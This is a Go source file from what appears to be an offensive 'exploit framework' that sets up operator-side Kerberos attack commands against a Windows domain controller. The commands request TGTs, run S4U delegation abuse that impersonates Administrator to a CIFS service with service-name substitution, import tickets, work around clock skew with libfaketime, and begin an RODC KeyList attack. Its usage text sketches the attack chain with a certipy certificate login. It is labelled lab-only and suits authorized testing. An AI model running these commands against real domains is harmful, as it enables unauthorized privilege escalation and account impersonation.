package preimplant

import (
	"fmt"
	"time"

	"github.com/KKingZero/erebus-exploit-framwork/pkg/krb"
)

// RunKerberos is host-side (no teamserver): skew | with-skew.
func RunKerberos(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", krbUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(krbUsage)
		return nil
	case "skew":
		return kerberosSkew(args[1:])
	case "with-skew":
		return kerberosWithSkew(args[1:])
	case "ticket":
		return kerberosTicket(args[1:])
	case "asktgt", "asreq":
		return kerberosAskTGT(args[1:])
	case "s4u":
		return kerberosS4U(args[1:])
	case "keylist":
		return kerberosKeyList(args[1:])
	default:
		return fmt.Errorf("unknown kerberos command %q\n%s", args[0], krbUsage)
	}
}

const krbUsage = `erebus kerberos — operator-host Kerberos (no implant)

  erebus kerberos skew --dc H
  erebus kerberos with-skew --dc H -- certipy auth -pfx admin.pfx -dc-ip H
  erebus kerberos ticket import <kirbi|ccache>
  erebus kerberos ticket list
  erebus kerberos asktgt --dc H --domain D --user U --pass-file P
  erebus kerberos s4u --dc H --domain D --user ATTACK$ --pass-file P \
      --impersonate Administrator --spn cifs/dc.domain.htb [--altservice CIFS/other]
  erebus kerberos keylist --dc H --domain D --user Administrator --rodc-no N --aes-file KEY

AES TGT / S4U only (no RC4). Tickets land in ~/.erebus/tickets (EREBUS_TICKET_DIR).
with-skew wraps a command in libfaketime. Lab-only.
`

func kerberosSkew(args []string) error {
	f, _ := ParseFlags(args)
	dc := first(f, "dc", "host")
	if dc == "" {
		return fmt.Errorf("--dc required")
	}
	printProxyHint()
	res, err := krb.CheckSkewVsDC(dc, first(f, "user"), first(f, "pass"), krb.DefaultMaxSkew)
	if err != nil {
		return err
	}
	fmt.Println(res.Summary())
	if !res.OK() {
		return fmt.Errorf("skew_delta=%s FAIL (asktgt/s4u apply this internally; faketime not required)", krb.FormatDelta(res.Delta))
	}
	return nil
}

func kerberosWithSkew(args []string) error {
	f, rest := ParseFlags(args)
	dc := first(f, "dc", "host")
	if dc == "" || len(rest) == 0 {
		return fmt.Errorf("usage: erebus kerberos with-skew --dc H -- <command...>")
	}
	res, err := krb.CheckSkewVsDC(dc, first(f, "user"), first(f, "pass"), 24*time.Hour)
	if err != nil {
		return err
	}
	fmt.Println(res.Summary())
	return krb.RunWithSkew(res.Delta, rest)
}

func kerberosTicket(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: erebus kerberos ticket import <file> | list")
	}
	switch args[0] {
	case "import":
		if len(args) < 2 {
			return fmt.Errorf("usage: erebus kerberos ticket import <kirbi|ccache>")
		}
		m, err := krb.ImportTicket(args[1], "")
		if err != nil {
			return err
		}
		fmt.Printf("ok ticket id=%s principal=%s@%s server=%s etype=%d source=%s\n",
			m.ID, m.Principal, m.Realm, m.Server, m.EType, m.Source)
		fmt.Printf("ccache %s\n", m.CCache)
		return nil
	case "list":
		list, err := krb.ListTickets("")
		if err != nil {
			return err
		}
		if len(list) == 0 {
			fmt.Println("(no tickets)")
			return nil
		}
		for _, m := range list {
			fmt.Printf("%s  %s@%s  %s  etype=%d  %s\n", m.ID, m.Principal, m.Realm, m.Server, m.EType, m.Source)
		}
		return nil
	default:
		return fmt.Errorf("usage: erebus kerberos ticket import <file> | list")
	}
}

func kerberosAskTGT(args []string) error {
	f, _ := ParseFlags(args)
	pass, err := readSecret(f, "pass", "pass-file")
	if err != nil {
		return err
	}
	printProxyHint()
	m, err := krb.AskTGT(krb.AskTGTOptions{
		Domain:   first(f, "domain"),
		Username: first(f, "user", "username"),
		Password: pass,
		KDC:      first(f, "dc", "host", "kdc"),
	})
	if err != nil {
		return err
	}
	fmt.Printf("ok asktgt id=%s principal=%s@%s server=%s etype=%d skew_delta=%s\n",
		m.ID, m.Principal, m.Realm, m.Server, m.EType, krb.FormatDelta(krb.ClockOffset()))
	fmt.Printf("ccache %s\n", m.CCache)
	return nil
}

func kerberosS4U(args []string) error {
	f, _ := ParseFlags(args)
	pass, err := readSecret(f, "pass", "pass-file")
	if err != nil {
		return err
	}
	printProxyHint()
	m, err := krb.S4U(krb.S4UOptions{
		Domain:      first(f, "domain"),
		Username:    first(f, "user", "username"),
		Password:    pass,
		KDC:         first(f, "dc", "host", "kdc"),
		Impersonate: first(f, "impersonate", "imp"),
		SPN:         first(f, "spn", "service"),
		AltService:  first(f, "altservice", "alt-service"),
	})
	if err != nil {
		return err
	}
	fmt.Printf("ok s4u id=%s principal=%s@%s server=%s etype=%d skew_delta=%s\n",
		m.ID, m.Principal, m.Realm, m.Server, m.EType, krb.FormatDelta(krb.ClockOffset()))
	fmt.Printf("ccache %s\n", m.CCache)
	return nil
}

func kerberosKeyList(args []string) error {
	f, _ := ParseFlags(args)
	aes, err := readSecret(f, "aes", "aes-file")
	if err != nil {
		return err
	}
	var rodc uint32
	if s := first(f, "rodc-no", "rodc"); s != "" {
		var n uint64
		_, _ = fmt.Sscanf(s, "%d", &n)
		rodc = uint32(n)
	}
	kv, err := krb.ValidateKeyList(krb.KeyListOptions{
		RODCNumber: rodc,
		AESKeyHex:  aes,
		User:       first(f, "user", "impersonate"),
		Domain:     first(f, "domain"),
		KDC:        first(f, "dc", "host", "kdc"),
	})
	if err != nil {
		return err
	}
	return fmt.Errorf("keylist kvno=%d validated; TGT forge/KERB-KEY-LIST exchange not wired (fixture path)", kv)
}
